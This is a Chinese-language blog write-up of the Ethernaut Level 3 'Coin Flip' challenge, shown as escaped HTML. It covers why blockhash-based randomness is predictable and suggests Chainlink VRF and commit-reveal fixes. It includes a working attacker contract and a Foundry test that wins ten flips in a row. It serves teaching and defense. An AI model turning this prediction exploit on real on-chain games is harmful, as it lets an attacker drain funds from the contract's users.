class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 攻击者可以：</span><br><span class=\"line\">// 1. 在同一交易中执行相同计算</span><br><span class=\"line\">// 2. 预先验证结果，只在有利时提交</span><br><span class=\"line\">// 3. 使用合约自动化攻击</span><br><span class=\"line\"></span><br><span class=\"line\">contract SmartAttacker &#123;</span><br><span class=\"line\">    function conditionalAttack(CoinFlip target, bool guess) public &#123;</span><br><span class=\"line\">        // 预先计算</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool predictedSide = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 只在预测正确时才攻击</span><br><span class=\"line\">        if (predictedSide == guess) &#123;</span><br><span class=\"line\">            target.flip(guess);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // 否则什么都不做，等待下一个有利机会</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-真随机数-vs-伪随机数\"><a href=\"#3-真随机数-vs-伪随机数\" class=\"headerlink\" title=\"3. 真随机数 vs 伪随机数\"></a>3. 真随机数 vs 伪随机数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 伪随机数（确定性）</span><br><span class=\"line\">function badRandom() public view returns (uint256) &#123;</span><br><span class=\"line\">    return uint256(keccak256(abi.encodePacked(</span><br><span class=\"line\">        block.timestamp,</span><br><span class=\"line\">        block.difficulty,</span><br><span class=\"line\">        msg.sender</span><br><span class=\"line\">    )));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 真随机数（使用预言机）</span><br><span class=\"line\">function goodRandom() public &#123;</span><br><span class=\"line\">    // 通过 Chainlink VRF 请求真正的随机数</span><br><span class=\"line\">    requestRandomness(keyHash, fee);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🏛️-历史案例\"><a href=\"#🏛️-历史案例\" class=\"headerlink\" title=\"🏛️ 历史案例\"></a>🏛️ 历史案例</h2><h3 id=\"著名的随机数攻击事件\"><a href=\"#著名的随机数攻击事件\" class=\"headerlink\" title=\"著名的随机数攻击事件\"></a>著名的随机数攻击事件</h3><ol>\n<li><p><strong>SmartBillions</strong> (2017)</p>\n<ul>\n<li>损失: 400 ETH</li>\n<li>原因: 使用 <code>block.blockhash</code> 作为随机源</li>\n<li>攻击: 预测未来区块哈希</li>\n</ul>\n</li>\n<li><p><strong>Fomo3D</strong> (2018)</p>\n<ul>\n<li>影响: 游戏机制被操控</li>\n<li>原因: 使用可预测的时间戳</li>\n<li>后果: 奖池分配不公</li>\n</ul>\n</li>\n<li><p><strong>TheRun</strong> (2019)</p>\n<ul>\n<li>损失: 大量代币</li>\n<li>原因: 复杂但仍可预测的随机数算法</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Coin Flip 关卡揭示了区块链随机数的根本问题：</p>\n<ul>\n<li>✅ <strong>区块链是确定性系统</strong> - 相同输入必然产生相同输出</li>\n<li>✅ <strong>透明性带来可预测性</strong> - 所有数据都是公开的</li>\n<li>✅ <strong>真随机数需要外部熵源</strong> - 必须依赖链下随机性</li>\n<li>✅ <strong>预言机是最佳解决方案</strong> - Chainlink VRF 等服务</li>\n</ul>\n<p>这个看似简单的猜硬币游戏，实际上涉及密码学、概率论和分布式系统的深层概念。理解其原理对于构建安全的智能合约至关重要。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">上一关: Level 2 - Fallout</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">下一关: Level 4 - Telephone</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.chain.link/vrf/v2/introduction\">Chainlink VRF 文档</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n<hr>\n<p><em>在区块链的确定性世界中，真正的随机性是一种珍贵的资源。</em> 🎲</p>\n","more":"<h1 id=\"🎯-Ethernaut-Level-3-Coin-Flip-伪随机数攻击详解\"><a href=\"#🎯-Ethernaut-Level-3-Coin-Flip-伪随机数攻击详解\" class=\"headerlink\" title=\"🎯 Ethernaut Level 3: Coin Flip - 伪随机数攻击详解\"></a>🎯 Ethernaut Level 3: Coin Flip - 伪随机数攻击详解</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/3\">Ethernaut Level 3 - Coin Flip</a><br><strong>攻击类型</strong>: 伪随机数预测攻击<br><strong>难度</strong>: ⭐⭐⭐☆☆<br><strong>核心概念</strong>: 区块链确定性、可预测性</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>这个关卡考验对区块链随机数机制的理解：</p>\n<ol>\n<li><strong>连续猜对10次</strong> - 连续正确预测硬币正反面</li>\n<li><strong>理解伪随机数</strong> - 掌握区块链”随机数”的本质</li>\n<li><strong>学习预测技术</strong> - 利用区块链的确定性进行攻击</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlip &#123;</span><br><span class=\"line\">  uint256 public consecutiveWins;</span><br><span class=\"line\">  uint256 lastHash;</span><br><span class=\"line\">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\"></span><br><span class=\"line\">  constructor() &#123;</span><br><span class=\"line\">    consecutiveWins = 0;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class=\"line\">    // 🚨 关键漏洞：使用可预测的区块哈希</span><br><span class=\"line\">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">    </span><br><span class=\"line\">    if (lastHash == blockValue) &#123;</span><br><span class=\"line\">      revert();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    lastHash = blockValue;</span><br><span class=\"line\">    // 🚨 伪随机数生成逻辑</span><br><span class=\"line\">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">    bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (side == _guess) &#123;</span><br><span class=\"line\">      consecutiveWins++;</span><br><span class=\"line\">      return true;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">      consecutiveWins = 0;</span><br><span class=\"line\">      return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞识别\"><a href=\"#漏洞识别\" class=\"headerlink\" title=\"漏洞识别\"></a>漏洞识别</h3><p><strong>伪随机数的根本缺陷</strong>：</p>\n<ol>\n<li><strong>数据源可预测</strong> - <code>blockhash(block.number - 1)</code> 是公开可查的</li>\n<li><strong>算法透明</strong> - 随机数生成算法完全公开</li>\n<li><strong>确定性计算</strong> - 相同输入必然产生相同输出</li>\n</ol>\n<p><strong>攻击原理</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 合约使用的&quot;随机数&quot;生成</span><br><span class=\"line\">uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\"></span><br><span class=\"line\">// 攻击者可以在同一个区块内执行相同计算</span><br><span class=\"line\">// 由于使用相同的 blockhash，结果必然相同！</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"攻击流程\"><a href=\"#攻击流程\" class=\"headerlink\" title=\"攻击流程\"></a>攻击流程</h3><ol>\n<li><strong>获取当前区块哈希</strong> - 读取 <code>blockhash(block.number - 1)</code></li>\n<li><strong>执行相同计算</strong> - 使用相同的算法计算结果</li>\n<li><strong>提前知道答案</strong> - 在调用 <code>flip()</code> 前就知道正确答案</li>\n<li><strong>提交正确猜测</strong> - 保证100%胜率</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/CoinFlip.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlipAttacker &#123;</span><br><span class=\"line\">    CoinFlip public target;</span><br><span class=\"line\">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = CoinFlip(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        // 🎯 关键：在同一区块内执行相同的计算</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 提交预先计算好的答案</span><br><span class=\"line\">        target.flip(side);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlipTest is Test &#123;</span><br><span class=\"line\">    CoinFlip public coinFlip;</span><br><span class=\"line\">    CoinFlipAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attackerAddr = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署目标合约</span><br><span class=\"line\">        coinFlip = new CoinFlip();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署攻击合约</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker = new CoinFlipAttacker(address(coinFlip));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testCoinFlipExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;Initial consecutive wins:&quot;, coinFlip.consecutiveWins());</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attackerAddr);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 连续攻击10次以获得10连胜</span><br><span class=\"line\">        for (uint i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">            // 模拟新区块（每次攻击都在新区块进行）</span><br><span class=\"line\">            vm.roll(block.number + 1);</span><br><span class=\"line\">            </span><br><span class=\"line\">            uint256 winsBefore = coinFlip.consecutiveWins();</span><br><span class=\"line\">            attacker.attack();</span><br><span class=\"line\">            uint256 winsAfter = coinFlip.consecutiveWins();</span><br><span class=\"line\">            </span><br><span class=\"line\">            console.log(&quot;Round&quot;, i + 1, &quot;- Wins:&quot;, winsAfter);</span><br><span class=\"line\">            </span><br><span class=\"line\">            // 验证每次攻击都成功</span><br><span class=\"line\">            assertEq(winsAfter, winsBefore + 1);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证最终达成10连胜</span><br><span class=\"line\">        assertEq(coinFlip.consecutiveWins(), 10);</span><br><span class=\"line\">        console.log(&quot;Attack successful! 10 consecutive wins achieved.&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPredictability() public view &#123;</span><br><span class=\"line\">        // 演示随机数的可预测性</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Block hash:&quot;, blockValue);</span><br><span class=\"line\">        console.log(&quot;Coin flip result:&quot;, side);</span><br><span class=\"line\">        console.log(&quot;This result is 100% predictable!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行 Coin Flip 攻击测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract CoinFlipTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 预期输出：</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testCoinFlipExploit()</span></span><br><span class=\"line\"><span class=\"comment\"># Round 1 - Wins: 1</span></span><br><span class=\"line\"><span class=\"comment\"># Round 2 - Wins: 2</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\"><span class=\"comment\"># Round 10 - Wins: 10</span></span><br><span class=\"line\"><span class=\"comment\"># Attack successful! 10 consecutive wins achieved.</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-使用-Chainlink-VRF-推荐\"><a href=\"#1-使用-Chainlink-VRF-推荐\" class=\"headerlink\" title=\"1. 使用 Chainlink VRF (推荐)\"></a>1. 使用 Chainlink VRF (推荐)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol&quot;;</span><br><span class=\"line\">import &quot;@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureCoinFlip is VRFConsumerBaseV2 &#123;</span><br><span class=\"line\">    VRFCoordinatorV2Interface COORDINATOR;</span><br><span class=\"line\">    </span><br><span class=\"line\">    uint64 s_subscriptionId;</span><br><span class=\"line\">    bytes32 keyHash;</span><br><span class=\"line\">    uint32 callbackGasLimit = 100000;</span><br><span class=\"line\">    uint16 requestConfirmations = 3;</span><br><span class=\"line\">    uint32 numWords = 1;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(uint256 =&gt; address) public requestIdToSender;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(uint64 subscriptionId, address vrfCoordinator) </span><br><span class=\"line\">        VRFConsumerBaseV2(vrfCoordinator) &#123;</span><br><span class=\"line\">        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);</span><br><span class=\"line\">        s_subscriptionId = subscriptionId;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function flip(bool _guess) public &#123;</span><br><span class=\"line\">        // 请求真正的随机数</span><br><span class=\"line\">        uint256 requestId = COORDINATOR.requestRandomWords(</span><br><span class=\"line\">            keyHash,</span><br><span class=\"line\">            s_subscriptionId,</span><br><span class=\"line\">            requestConfirmations,</span><br><span class=\"line\">            callbackGasLimit,</span><br><span class=\"line\">            numWords</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        requestIdToSender[requestId] = msg.sender;</span><br><span class=\"line\">        // 存储用户的猜测...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) </span><br><span class=\"line\">        internal override &#123;</span><br><span class=\"line\">        // 使用真正的随机数处理结果</span><br><span class=\"line\">        bool side = (randomWords[0] % 2) == 1;</span><br><span class=\"line\">        address sender = requestIdToSender[requestId];</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 处理游戏逻辑...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用未来区块哈希-提交-揭示方案\"><a href=\"#2-使用未来区块哈希-提交-揭示方案\" class=\"headerlink\" title=\"2. 使用未来区块哈希 + 提交-揭示方案\"></a>2. 使用未来区块哈希 + 提交-揭示方案</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitRevealCoinFlip &#123;</span><br><span class=\"line\">    struct Game &#123;</span><br><span class=\"line\">        bytes32 commitment;</span><br><span class=\"line\">        uint256 revealBlock;</span><br><span class=\"line\">        bool revealed;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(address =&gt; Game) public games;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function commitFlip(bytes32 _commitment) public &#123;</span><br><span class=\"line\">        games[msg.sender] = Game(&#123;</span><br><span class=\"line\">            commitment: _commitment,</span><br><span class=\"line\">            revealBlock: block.number + 10, // 10个区块后才能揭示</span><br><span class=\"line\">            revealed: false</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function revealFlip(bool _guess, uint256 _nonce) public &#123;</span><br><span class=\"line\">        Game storage game = games[msg.sender];</span><br><span class=\"line\">        </span><br><span class=\"line\">        require(block.number &gt;= game.revealBlock, &quot;Too early to reveal&quot;);</span><br><span class=\"line\">        require(!game.revealed, &quot;Already revealed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证承诺</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_guess, _nonce, msg.sender));</span><br><span class=\"line\">        require(hash == game.commitment, &quot;Invalid commitment&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 使用未来区块哈希</span><br><span class=\"line\">        uint256 futureBlockHash = uint256(blockhash(game.revealBlock));</span><br><span class=\"line\">        bool result = (futureBlockHash % 2) == 1;</span><br><span class=\"line\">        </span><br><span class=\"line\">        game.revealed = true;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 处理结果...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-多源熵组合\"><a href=\"#3-多源熵组合\" class=\"headerlink\" title=\"3. 多源熵组合\"></a>3. 多源熵组合</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MultiSourceRandom &#123;</span><br><span class=\"line\">    uint256 private nonce;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getRandomNumber() private returns (uint256) &#123;</span><br><span class=\"line\">        // ⚠️ 仍不够安全，仅作教学示例</span><br><span class=\"line\">        nonce++;</span><br><span class=\"line\">        return uint256(keccak256(abi.encodePacked(</span><br><span class=\"line\">            block.difficulty,    // 矿工可操控</span><br><span class=\"line\">            block.timestamp,     // 矿工可小幅操控</span><br><span class=\"line\">            msg.sender,</span><br><span class=\"line\">            nonce,</span><br><span class=\"line\">            blockhash(block.number - 1)</span><br><span class=\"line\">        )));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"1-区块链随机数常见误区\"><a href=\"#1-区块链随机数常见误区\" class=\"headerlink\" title=\"1. 区块链随机数常见误区\"></a>1. 区块链随机数常见误区</h3><table>\n<thead>\n<tr>\n<th>数据源</th>\n<th>安全性</th>\n<th>操控难度</th>\n<th>推荐使用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>block.timestamp</code></td>\n<td>❌ 极低</td>\n<td>容易</td>\n<td>否</td>\n</tr>\n<tr>\n<td><code>block.difficulty</code></td>\n<td>❌ 低</td>\n<td>中等</td>\n<td>否</td>\n</tr>\n<tr>\n<td><code>blockhash</code></td>\n<td>❌ 低</td>\n<td>困难</td>\n<td>否</td>\n</tr>\n<tr>\n<td><code>keccak256(组合)</code></td>\n<td>❌ 低</td>\n<td>取决于组合</td>\n<td>否</td>\n</tr>\n<tr>\n<td><strong>Chainlink VRF</strong></td>\n<td>✅ 高</td>\n<td>极困难</td>\n<td><strong>是</strong></td>\n</tr>\n</tbody></table>\n<h3 id=\"2-攻击者的优势\"><a href=\"#2-攻击者的优势\" class=\"headerlink\" title=\"2. 攻击者的优势\"></a>2. 攻击者的优势</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 攻击者可以：</span><br><span class=\"line\">// 1. 在同一交易中执行相同计算</span><br><span class=\"line\">// 2. 预先验证结果，只在有利时提交</span><br><span 